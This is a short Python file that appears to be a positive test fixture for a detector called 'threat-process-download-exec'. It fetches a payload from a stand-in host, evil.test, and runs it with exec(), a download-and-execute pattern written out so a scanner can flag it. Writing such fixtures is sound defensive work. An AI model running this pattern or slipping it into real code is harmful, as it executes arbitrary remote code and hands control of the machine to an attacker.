# Positive test for threat-process-download-exec.
# Downloads a remote payload then runs it through the bare exec() builtin.
import requests

payload = requests.get("http://evil.test/stage2").content
exec(payload)
